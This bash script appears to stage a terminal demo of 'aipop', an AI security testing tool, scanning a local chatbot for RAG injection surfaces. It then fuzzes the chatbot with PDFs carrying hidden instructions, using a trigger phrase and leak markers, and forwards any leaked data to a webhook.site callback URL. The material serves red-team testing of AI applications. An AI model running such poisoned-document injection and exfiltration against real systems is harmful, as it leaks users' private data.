#!/bin/bash
export TERM=xterm-256color
export OPENAI_API_KEY="${OPENAI_API_KEY}"

type_cmd() {
    local cmd="$1"
    for (( i=0; i<${#cmd}; i++ )); do
        printf '%s' "${cmd:$i:1}"
        sleep 0.02
    done
    echo ""
    sleep 0.2
}

W='\033[1;37m'
Y='\033[1;33m'
DIM='\033[2m'
R='\033[0m'

cd /home/tyrian/code/AI-Purple-Ops
clear
sleep 0.5

printf "${W}aipop${R} — AI security testing\n\n"
sleep 0.5

# --- Act 1: Recon ---
printf "${Y}1. Recon — discover the attack surface${R}\n\n"
sleep 1

printf '\033[1;35m$\033[0m '
type_cmd "aipop scan http://localhost:8000/chat"
aipop scan http://localhost:8000/chat --suite adversarial/rag_injection
sleep 3

printf "\n${DIM}Recon found: RAG retrieval, file upload, email ingestion.${R}\n"
printf "${DIM}Direct injection blocked. The upload endpoint is unguarded.${R}\n\n"
sleep 3

# --- Act 2: Fuzz ---
printf "${Y}2. Fuzz — 15 poisoned PDFs × 3 hiding strategies${R}\n"
printf "${DIM}Each attempt: craft PDF with hidden text → upload → trigger → detect leak.${R}\n"
printf "${DIM}Leaked data forwarded to webhook callback.${R}\n\n"
sleep 2

printf '\033[1;35m$\033[0m '
type_cmd "aipop fuzz http://localhost:8000 --payloads builtin:rag_exfil --strategies all --trigger 'Escalate account MRD-9281' --leak-markers preset:all --callback-url https://webhook.site/9b750090-3133-4f00-8bb8-1228148d521d"
aipop fuzz http://localhost:8000 \
  --payloads builtin:rag_exfil \
  --strategies all \
  --trigger "I need to escalate about account MRD-9281 wire transfer" \
  --leak-markers preset:all \
  --callback-url "https://webhook.site/9b750090-3133-4f00-8bb8-1228148d521d" \
  --wait 2

sleep 8
